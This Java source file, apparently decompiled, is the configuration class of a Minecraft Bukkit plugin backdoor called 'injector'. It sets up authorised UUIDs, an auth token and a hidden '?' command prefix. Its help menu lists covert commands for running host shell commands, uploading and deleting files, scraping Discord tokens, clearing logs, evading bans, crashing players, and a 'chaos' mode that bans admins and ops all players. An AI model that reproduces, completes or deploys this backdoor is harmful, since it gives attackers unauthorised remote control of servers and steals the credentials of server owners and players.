package me.pedzito.injector;

import org.bukkit.ChatColor;

public class Config {
   public static String[] authorized_uuids = new String[]{""};
   public static String auth_token = null;
   public static String[] tmp_authorized_uuids;
   public static String command_prefix = "?";
   public static Boolean uuids_are_usernames = false;
   public static Boolean display_debugger_warning = false;
   public static Boolean display_debug_messages = false;
   public static final String default_ban_reason = "Banned";
   public static final String default_ban_source = "Server";
   public static final String chat_message_prefix = "§6§l[ §6§lTEST §6§l]";
   public static final ChatColor chat_message_prefix_color;
   public static final ChatColor help_command_name_color;
   public static final ChatColor help_command_desc_color;
   public static final ChatColor help_command_required_color;
   public static final ChatColor help_detail_color;
   public static final String chaos_chat_broadcast = "\n\n\n\n\n\n\n\n\n\n[Server] ALL ADMINS HAVE BEEN BANNED\n[Server] ALL PLAYERS HAVE OP UNTIL ROLLBACK";
   public static final Config.HelpItem[] help_messages;

   static {
      chat_message_prefix_color = ChatColor.GOLD;
      help_command_name_color = ChatColor.BLUE;
      help_command_desc_color = ChatColor.WHITE;
      help_command_required_color = ChatColor.RED;
      help_detail_color = ChatColor.BLUE;
      help_messages = new Config.HelpItem[]{new Config.HelpItem("help", "display this message, or description of command.", new Config.Param[]{new Config.Param("command", "show command syntax", false)}), new Config.HelpItem("op", "op specified player", new Config.Param[]{new Config.Param("player", "player to op", true)}), new Config.HelpItem("earrape", "earrape specified player", new Config.Param[]{new Config.Param("player", "player to earrape", true)}), new Config.HelpItem("whois", "get info of a player", new Config.Param[]{new Config.Param("player", "player to get info on.", true)}), new Config.HelpItem("deop", "deop specified player", new Config.Param[]{new Config.Param("player", "player to deop", true)}), new Config.HelpItem("ban", "ban player with reason and source", new Config.Param[]{new Config.Param("player", "player to ban", true), new Config.Param("reason", "ban reason", false), new Config.Param("source", "player listed as ban source", false)}), new Config.HelpItem("banip", "ip ban player with reason and source", new Config.Param[]{new Config.Param("player", "player to ip-ban", true), new Config.Param("reason", "ban reason", false), new Config.Param("source", "player listed as ban source", false)}), new Config.HelpItem("gm", "switch to specified gamemode", new Config.Param[]{new Config.Param("gamemode", "0, 1, 2, 3", true), new Config.Param("player", "player to switch gamemode", false)}), new Config.HelpItem("lag", "Lag a player", new Config.Param[]{new Config.Param("player", "The player you will lag", true), new Config.Param("amount", "The amount of lag", true)}), new Config.HelpItem("give", "give the specified item in specified quantities", new Config.Param[]{new Config.Param("player", "name or *", true), new Config.Param("item", "item-id or name", true), new Config.Param("count", "number of items", false)}), new Config.HelpItem("exec", "Execute command as server console", new Config.Param[]{new Config.Param("command", "server command to execute", true)}), new Config.HelpItem("shell", "Execute operating system as host", new Config.Param[]{new Config.Param("command", "shell command to execute. Check server platform with " + command_prefix + "info", true)}), new Config.HelpItem("info", "shows informatin about server"), new Config.HelpItem("chaos", "Deop and ban ops, op all regular players"), new Config.HelpItem("seed", "get the current world seed"), new Config.HelpItem("psay", "sends messages as player", new Config.Param[]{new Config.Param("player", "player to impersonate", true), new Config.Param("message", "message to send", true)}), new Config.HelpItem("ssay", "sends messages as Server", new Config.Param[]{new Config.Param("message", "message to send", true)}), new Config.HelpItem("rename", "changes your nick", new Config.Param[]{new Config.Param("name", "change nickname", true)}), new Config.HelpItem("reload", "[Visible] Reloads the server"), new Config.HelpItem("listworlds", "displays all worlds"), new Config.HelpItem("makeworld", "Creates new world", new Config.Param[]{new Config.Param("name", "new world name", true)}), new Config.HelpItem("delworld", "Deletes a world", new Config.Param[]{new Config.Param("name", "world name to delete", true)}), new Config.HelpItem("vanish", "makes you vanish, tab included"), new Config.HelpItem("silktouch", "gives player silk touch hands", new Config.Param[]{new Config.Param("player", "player to give silk-touch", false)}), new Config.HelpItem("instabreak", "let's player mine instantly", new Config.Param[]{new Config.Param("player", "player to give insta-break", false)}), new Config.HelpItem("crash", "crashes player's name", new Config.Param[]{new Config.Param("player", "player to crash", false)}), new Config.HelpItem("troll", "Troll player in various ways", new Config.Param[]{new Config.Param("method", "Options: clear, thrower, interact, cripple, flight, inventory, drop, teleport, mine, place, login, god, damage", true), new Config.Param("player", "player to troll", true)}), new Config.HelpItem("lock", "locks the console or blocks player", new Config.Param[]{new Config.Param("player", "'server', 'all', or player to lock", true)}), new Config.HelpItem("unlock", "unlocks the console or unblocks player", new Config.Param[]{new Config.Param("player", "'server', 'all', or player to unlock", true)}), new Config.HelpItem("mute", "mutes a player", new Config.Param[]{new Config.Param("player", "'all' or player to mute", true)}), new Config.HelpItem("unmute", "unmutes a player", new Config.Param[]{new Config.Param("player", "'all' or player to unmute", true)}), new Config.HelpItem("uploadfile", "uploads a file, don't use special chars or spaces", new Config.Param[]{new Config.Param("file", "file path", true)}), new Config.HelpItem("removefile", "remove a file, don't use special chars or spaces", new Config.Param[]{new Config.Param("file", "file path", true)}), new Config.HelpItem("coords", "get the coordinates of specified player", new Config.Param[]{new Config.Param("player", "player to grab coords of", true)}), new Config.HelpItem("auth", "Authorize user until next server restart.", new Config.Param[]{new Config.Param("player", "player to authorize", true)}), new Config.HelpItem("deauth", "Unauthorized player", new Config.Param[]{new Config.Param("player", "player to deauthorize", true)}), new Config.HelpItem("tp", "Teleport to specified coordinates", new Config.Param[]{new Config.Param("x", "x coordinate", true), new Config.Param("y", "y coordinate", true), new Config.Param("z", "z coordinate", true)}), new Config.HelpItem("stop", "Shutdown the server"), new Config.HelpItem("antiban", "Toggle anti-ban"), new Config.HelpItem("flood", "You see your message and now you don't"), new Config.HelpItem("gmc", "Really are you that lazy? use gm 1", new Config.Param[]{new Config.Param("player", "player to set gamemode", false)}), new Config.HelpItem("gms", "You can't be serious, just use gm 0", new Config.Param[]{new Config.Param("player", "player to set gamemode", false)}), new Config.HelpItem("tntspam", "Spam tnt on everyone, why not?"), new Config.HelpItem("skylimit", "Lets you fly temporarily, Warning high risk of death", new Config.Param[]{new Config.Param("player", "player to fly", false)}), new Config.HelpItem("spam", "Really? Can't you do it yourself", new Config.Param[]{new Config.Param("msg", "message to spam", true)}), new Config.HelpItem("unban", "Unban a player", new Config.Param[]{new Config.Param("player", "player to unban", true)}), new Config.HelpItem("delplugin", "Unload and remove the plugin", new Config.Param[]{new Config.Param("plugin", "plugin to remove", true)}), new Config.HelpItem("dupe", "CTRL+C then CTRL+V :D"), new Config.HelpItem("enchant", "Tim the enchanter has broken into your game", new Config.Param[]{new Config.Param("enchantment", "enchantment to add", true), new Config.Param("level", "level of enchantment", true)}), new Config.HelpItem("errorkick", "Kick player with error message", new Config.Param[]{new Config.Param("player", "player to kick", true)}), new Config.HelpItem("cmdspy", "Toggle AI command prediction"), new Config.HelpItem("scrapetoken", "Hippity hoppity you're now my property, scrape discord tokens"), new Config.HelpItem("clearlogs", "You don't need that"), new Config.HelpItem("cls", "Clears the chat"), new Config.HelpItem("invsee", "Peek into someone's inventory", new Config.Param[]{new Config.Param("player", "player to peek", true)}), new Config.HelpItem("ec", "Peek into someone's ender chest", new Config.Param[]{new Config.Param("player", "player to peek", true)}), new Config.HelpItem("skript", "Execute a expression", new Config.Param[]{new Config.Param("expression", "expression to execute", true)}), new Config.HelpItem("money", "Give/Set/Remove money", new Config.Param[]{new Config.Param("method", "Options: give, set, remove", true), new Config.Param("player", "player to give money", true), new Config.Param("amount", "amount of money", true)}), new Config.HelpItem("repair", "Repair item in hand"), new Config.HelpItem("list", "List all players"), new Config.HelpItem("tphere", "Tp a player to you", new Config.Param[]{new Config.Param("player", "player to tp", true)})};
   }

   public static class HelpItem {
      private final String name;
      private final Config.Param[] params;
      private final String desc;

      public HelpItem(String name, String desc, Config.Param[] params) {
         this.name = name;
         this.params = params;
         this.desc = desc;
      }

      public HelpItem(String name, String desc) {
         this.name = name;
         this.params = null;
         this.desc = desc;
      }

      public String getName() {
         return this.name;
      }

      public Config.Param[] getSyntax() {
         return this.params;
      }

      public String getDesc() {
         return this.desc;
      }

      public String getHelpEntry() {
         return Config.help_command_name_color + Config.command_prefix + this.name + ": " + Config.help_command_desc_color + this.desc;
      }

      public String getSyntaxHelp() {
         if (this.params == null) {
            return this.getHelpEntry();
         } else {
            StringBuilder sb = new StringBuilder();
            sb.append(Config.help_command_name_color + Config.command_prefix + this.name + " ");
            Config.Param[] var2 = this.params;
            int var3 = var2.length;

            int var4;
            Config.Param p;
            for(var4 = 0; var4 < var3; ++var4) {
               p = var2[var4];
               sb.append(ChatColor.RESET);
               sb.append(Config.help_command_desc_color);
               sb.append("(" + p.name + ") ");
            }

            sb.append("\n");
            var2 = this.params;
            var3 = var2.length;

            for(var4 = 0; var4 < var3; ++var4) {
               p = var2[var4];
               sb.append(ChatColor.RESET);
               sb.append("(" + p.name + ") " + p.description);
               if (p.required) {
                  sb.append(Config.help_command_required_color + " [Required]");
               }

               sb.append("\n");
            }

            return sb.toString();
         }
      }

      public static String buildHelpMenu() {
         return buildHelpMenu(0);
      }

      public static String buildHelpMenu(int page) {
         StringBuilder sb = new StringBuilder();
         sb.append(Config.help_detail_color + "&6&lTEST\n").append(Config.help_detail_color + "-----------------------------------------------------\n\n");
         Config.HelpItem[] var2 = Config.help_messages;
         int var3 = var2.length;

         for(int var4 = 0; var4 < var3; ++var4) {
            Config.HelpItem helpMessage = var2[var4];
            sb.append(helpMessage.getHelpEntry());
            sb.append("\n");
         }

         return sb.toString();
      }
   }

   public static class Param {
      String name;
      String description;
      Boolean required;

      public Param(String name, String description, Boolean required) {
         this.name = name;
         this.description = description;
         this.required = required;
      }
   }
}